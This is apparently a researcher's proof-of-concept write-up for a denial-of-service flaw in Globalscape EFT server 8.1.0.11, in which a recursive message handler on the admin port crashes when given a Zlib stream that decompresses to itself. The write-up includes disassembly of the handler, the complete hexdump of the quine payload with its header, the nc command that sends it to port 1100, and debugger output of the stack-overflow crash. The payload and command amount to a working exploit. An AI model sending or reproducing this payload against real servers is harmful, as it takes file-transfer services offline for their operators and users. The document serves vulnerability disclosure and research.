This is a compression bomb that crashes the Globalscape EFT server (version
8.1.0.11) by sending a recursive Zlib stream to the admin port.

A special message id on Globalscape Admin - 0xff7f - indicates a compressed
message. After decompressing the message, it recursively processes the message.
If it's still compressed, it decompresses again, and so on. Here's what the
code looks like:

```
.text:00007FF777341610                         ; rdx = packet
.text:00007FF777341610                         ; r8 = length
.text:00007FF777341610
.text:00007FF777341610                         decompress_and_parse_packet proc near   ; CODE XREF: sub_7FF77713D9F0+BAC↑p
.text:00007FF777341610                                                                 ; decompress_and_parse_packet+8A↓p ...
.text:00007FF777341610
; [...]
.text:00007FF777341632 81 7A 04 7F FF 00 00                    cmp     dword ptr [rdx+4], 0FF7Fh ; <-- Compare message id to 0xff7f
.text:00007FF777341639 74 07                                   jz      short packet_is_compressed ; Jump if compressed
.text:00007FF77734163B E8 90 00 00 00                          call    sub_7FF7773416D0 ; <-- parse the uncompressed packet
.text:00007FF777341640 EB 6B                                   jmp     short return
.text:00007FF777341642                         ; ---------------------------------------------------------------------------
.text:00007FF777341642
.text:00007FF777341642                         packet_is_compressed:                   ; CODE XREF: decompress_and_parse_packet+29↑j
; [... do decompression stuff here ...]
.text:00007FF77734168F 4C 8B C0                                mov     r8, rax
.text:00007FF777341692 48 8B 54 24 28                          mov     rdx, [rsp+0C8h+var_A0]
.text:00007FF777341697 48 8B CE                                mov     rcx, rsi
.text:00007FF77734169A E8 71 FF FF FF                          call    decompress_and_parse_packet ; recurse after decompressing
[...]
```

Because it recurses, if the decompressed message expands back into the same
message, it'll infinitely recurse and crash the server.

Brandon @symmetric Enright, a friend of mine who's a crypto nerd, pointed me
towards "quines", which are, by definition, what I'm looking for - compressed
streams that decompress to the same stream.

Specifically, I found [this blog post](https://research.swtch.com/zip), which
demonstrates how to build a Deflate stream that will decompress back into itself
with an arbitrary prefix/affix - exactly what I needed!

With the help of another friend (David @matir Tomaschik), we brought that
code up to date and modified it to generate a Zlib stream. It created the
following stream, which contains a correct length and message id header:

```
$ hexdump -C recursive.zlib
00000000  e2 00 00 00 7f ff 00 00  78 9c 7a c4 c0 c0 50 ff  |........x.z...P.|
00000010  9f 81 a1 62 0e 00 10 00  ef ff 7a c4 c0 c0 50 ff  |...b......z...P.|
00000020  9f 81 a1 62 0e 00 10 00  ef ff 82 f1 61 7c 00 00  |...b........a|..|
00000030  05 00 fa ff 82 f1 61 7c  00 00 05 00 fa ff 00 05  |......a|........|
00000040  00 fa ff 00 14 00 eb ff  82 f1 61 7c 00 00 05 00  |..........a|....|
00000050  fa ff 00 05 00 fa ff 00  14 00 eb ff 42 88 21 c4  |............B.!.|
00000060  00 00 14 00 eb ff 42 88  21 c4 00 00 14 00 eb ff  |......B.!.......|
00000070  42 88 21 c4 00 00 14 00  eb ff 42 88 21 c4 00 00  |B.!.......B.!...|
00000080  14 00 eb ff 42 88 21 c4  00 00 00 00 ff ff 00 00  |....B.!.........|
00000090  00 ff ff 00 17 00 e8 ff  42 88 21 c4 00 00 00 00  |........B.!.....|
000000a0  ff ff 00 00 00 ff ff 00  17 00 e8 ff 42 12 46 16  |............B.F.|
000000b0  06 00 00 00 ff ff 01 08  00 f7 ff aa bb cc dd 00  |................|
000000c0  00 00 00 42 12 46 16 06  00 00 00 ff ff 01 08 00  |...B.F..........|
000000d0  f7 ff aa bb cc dd 00 00  00 00 aa bb cc dd 00 00  |................|
000000e0  00 00
```

Which, when the Zlib body is decompressed, becomes the same thing:

```
$ dd if=recursive.zlib bs=1 skip=8 count=213 2>/dev/null | openssl zlib -d | hexdump -C
00000000  e2 00 00 00 7f ff 00 00  78 9c 7a c4 c0 c0 50 ff  |........x.z...P.|
00000010  9f 81 a1 62 0e 00 10 00  ef ff 7a c4 c0 c0 50 ff  |...b......z...P.|
00000020  9f 81 a1 62 0e 00 10 00  ef ff 82 f1 61 7c 00 00  |...b........a|..|
00000030  05 00 fa ff 82 f1 61 7c  00 00 05 00 fa ff 00 05  |......a|........|
00000040  00 fa ff 00 14 00 eb ff  82 f1 61 7c 00 00 05 00  |..........a|....|
00000050  fa ff 00 05 00 fa ff 00  14 00 eb ff 42 88 21 c4  |............B.!.|
00000060  00 00 14 00 eb ff 42 88  21 c4 00 00 14 00 eb ff  |......B.!.......|
00000070  42 88 21 c4 00 00 14 00  eb ff 42 88 21 c4 00 00  |B.!.......B.!...|
00000080  14 00 eb ff 42 88 21 c4  00 00 00 00 ff ff 00 00  |....B.!.........|
00000090  00 ff ff 00 17 00 e8 ff  42 88 21 c4 00 00 00 00  |........B.!.....|
000000a0  ff ff 00 00 00 ff ff 00  17 00 e8 ff 42 12 46 16  |............B.F.|
000000b0  06 00 00 00 ff ff 01 08  00 f7 ff aa bb cc dd 00  |................|
000000c0  00 00 00 42 12 46 16 06  00 00 00 ff ff 01 08 00  |...B.F..........|
000000d0  f7 ff aa bb cc dd 00 00  00 00 aa bb cc dd 00 00  |................|
000000e0  00 00                                             |..|
```

We can send that to the admin port on Globalscape EFT:

```
$ nc -v 172.16.166.170 1100 < recursive.zlib | hexdump -C
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 172.16.166.170:1100.
00000000  2c 00 00 00 2b 00 00 00  56 52 53 4e 01 00 00 00  |,...+...VRSN....|
00000010  a0 01 00 80 50 54 59 50  01 00 00 00 00 00 00 00  |....PTYP........|
```

And watch the server crash:

```
(1458.1f90): Break instruction exception - code 80000003 (first chance)
ntdll!DbgBreakPoint:
00007ffb`70a43020 cc              int     3
0:095> g
(1458.1f4): Stack overflow - code c00000fd (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ntdll!RtlpAllocateHeap+0xb2:
00007ffb`709be412 e8c95bffff      call    ntdll!RtlTryEnterCriticalSection (00007ffb`709b3fe0)
0:090> k
 # Child-SP          RetAddr               Call Site
00 00000028`ed4e4000 00007ffb`709bc4f9     ntdll!RtlpAllocateHeap+0xb2
01 00000028`ed4e41d0 00007ffb`6df6ffa6     ntdll!RtlpAllocateHeapInternal+0x6c9
*** WARNING: Unable to verify checksum for C:\Program Files\Globalscape\EFT Server\cftpstes.exe
02 00000028`ed4e42e0 00007ff7`77b9b217     ucrtbase!_malloc_base+0x36
03 00000028`ed4e4310 00007ff7`77115803     cftpstes!OPENSSL_Applink+0xb35787
04 00000028`ed4e4340 00007ff7`777117b4     cftpstes!OPENSSL_Applink+0xafd73
05 00000028`ed4e4370 00007ff7`77341660     cftpstes!OPENSSL_Applink+0x6abd24
06 00000028`ed4e43a0 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbbd0
07 00000028`ed4e4470 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbc0f
08 00000028`ed4e4540 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbc0f
09 00000028`ed4e4610 00007ff7`7734169f     cftpstes!OPENSSL_Applink+0x2dbc0f
[...]
```

This currently hard-crashes the server.
